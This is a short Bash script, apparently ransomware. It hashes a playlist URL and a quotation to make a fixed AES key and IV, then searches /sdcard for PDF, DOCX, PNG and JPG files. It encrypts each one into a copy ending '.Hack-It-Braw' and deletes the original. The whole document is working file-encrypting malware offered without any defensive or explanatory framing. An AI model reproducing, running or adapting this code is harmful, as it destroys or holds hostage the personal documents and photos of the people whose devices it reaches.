KEY=$(echo -n "https://open.spotify.com/playlist/7F5tC5VYL5Pj075kBaQM1b?si=r84XWSPMRk-T0A5-MHXVoA" | sha256sum | cut -d' ' -f1)
IV=$(echo -n "Is it painful to be the person who waits? Or is it more painful to be the person who makes others wait? Either way, there's no need to wait anymore. That's what is most painful." | sha256sum | cut -d' ' -f1 | head -c 24)
ROOT="/sdcard"
SALT="KIIRO"

encrypt_file() {
    local file="$1"
    local out_file="$file.Hack-It-Braw"

    {
        echo "${SALT}"
        openssl enc -aes-256-cbc -K "$KEY" -iv "$IV" -nosalt -in "$file" 2>/dev/null
    } > "$out_file"

    rm -f "$file"
    echo "Encrypted and removed: $file -> $out_file"
}

export -f encrypt_file
export SALT KEY IV

find "$ROOT" -type f \( \
    -name "*.pdf" -o \
    -name "*.docx" -o \
    -name "*.png" -o \
    -name "*.jpg" \) \
    -exec bash -c 'encrypt_file "$0"' {} \;